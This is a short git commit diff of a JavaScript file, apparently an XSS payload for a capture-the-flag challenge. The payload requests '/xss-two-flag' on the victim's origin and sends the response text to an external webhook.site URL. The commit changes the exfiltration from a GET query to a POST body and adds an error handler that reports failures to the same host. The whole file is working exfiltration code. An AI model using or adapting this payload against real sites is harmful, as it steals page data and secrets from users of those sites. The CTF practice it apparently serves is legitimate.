d58b57b3dd4748b0fcb4fd82bd84422d428a6e52
sote-CJ <51846573+sote-CJ@users.noreply.github.com>
2026-03-21 08:49:01 +0900

    Update test.js

--- test.js
+++ test.js
@@ -2,7 +2,14 @@ var xhr = new XMLHttpRequest();
 xhr.open('GET', '/xss-two-flag', true);
 xhr.onload = function() {
     var exfil = new XMLHttpRequest();
-    exfil.open('GET', 'https://webhook.site/09621c79-5ff4-4808-8983-fcbc3a6059db/?flag=' + btoa(xhr.responseText), true);
-    exfil.send();
+    exfil.open('POST', 'https://webhook.site/09621c79-5ff4-4808-8983-fcbc3a6059db/', true);
+    exfil.setRequestHeader('Content-Type', 'text/plain');
+    exfil.send(xhr.responseText);
+};
+xhr.onerror = function() {
+    var exfil = new XMLHttpRequest();
+    exfil.open('POST', 'https://webhook.site/09621c79-5ff4-4808-8983-fcbc3a6059db/', true);
+    exfil.setRequestHeader('Content-Type', 'text/plain');
+    exfil.send('error: ' + xhr.status);
 };
 xhr.send();
